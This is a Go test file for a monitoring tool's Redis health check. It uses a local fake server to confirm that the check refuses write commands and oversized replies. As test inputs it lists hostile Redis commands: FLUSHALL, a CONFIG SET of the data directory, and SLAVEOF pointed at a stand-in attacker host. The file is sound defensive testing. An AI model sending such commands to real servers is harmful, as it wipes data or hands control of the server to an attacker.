package probe

import (
	"bufio"
	"context"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"argus/internal/store"
)

// fakeRedis answers every command with reply and keeps what it was sent.
func fakeRedis(t *testing.T, reply string) (addr string, sent func() []string) {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = ln.Close() })
	var mu sync.Mutex
	var lines []string
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go func() {
				defer func() { _ = conn.Close() }()
				_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
				r := bufio.NewReader(conn)
				for {
					line, err := r.ReadString('\n')
					if err != nil {
						return
					}
					line = strings.TrimSpace(line)
					mu.Lock()
					lines = append(lines, line)
					mu.Unlock()
					// One reply per command: a command ends with its last
					// argument, which is the line after a $ length.
					if !strings.HasPrefix(line, "*") && !strings.HasPrefix(line, "$") {
						_, _ = conn.Write([]byte(reply))
					}
				}
			}()
		}
	}()
	return ln.Addr().String(), func() []string {
		mu.Lock()
		defer mu.Unlock()
		return append([]string(nil), lines...)
	}
}

// Saving a monitor refuses a Redis command that is not a read. The check
// refuses it too, so a row that reached the table some other way cannot
// empty or reconfigure the server it is supposed to watch.
func TestRedisCheckSendsOnlyReadCommands(t *testing.T) {
	addr, sent := fakeRedis(t, "+OK\r\n")
	for _, cmd := range []string{"FLUSHALL", "CONFIG SET dir /tmp", "SLAVEOF evil.test 6379"} {
		m := store.Monitor{Type: "redis", Target: addr, Config: store.MonitorConfig{Query: cmd, TimeoutSeconds: 3}}
		if _, err := checkRedis(context.Background(), m); err == nil || !strings.Contains(err.Error(), "not a read command") {
			t.Errorf("%s: want it refused, got %v", cmd, err)
		}
	}
	for _, line := range sent() {
		for _, word := range []string{"FLUSHALL", "CONFIG", "SLAVEOF"} {
			if strings.EqualFold(line, word) {
				t.Fatalf("%s reached the server", word)
			}
		}
	}
	m := store.Monitor{Type: "redis", Target: addr, Config: store.MonitorConfig{Query: "GET health", TimeoutSeconds: 3}}
	if _, err := checkRedis(context.Background(), m); err != nil {
		t.Fatalf("a read command should run: %v", err)
	}
}

// A reply states its own length. One that claims more than a check would
// ever read is an error, not an allocation.
func TestRedisCheckRefusesAnOversizedReply(t *testing.T) {
	addr, _ := fakeRedis(t, "$4611686018427387904\r\n")
	m := store.Monitor{Type: "redis", Target: addr, Config: store.MonitorConfig{Query: "GET health", TimeoutSeconds: 3}}
	if _, err := checkRedis(context.Background(), m); err == nil || !strings.Contains(err.Error(), "larger than a check reads") {
		t.Fatalf("want the oversized reply refused, got %v", err)
	}
}
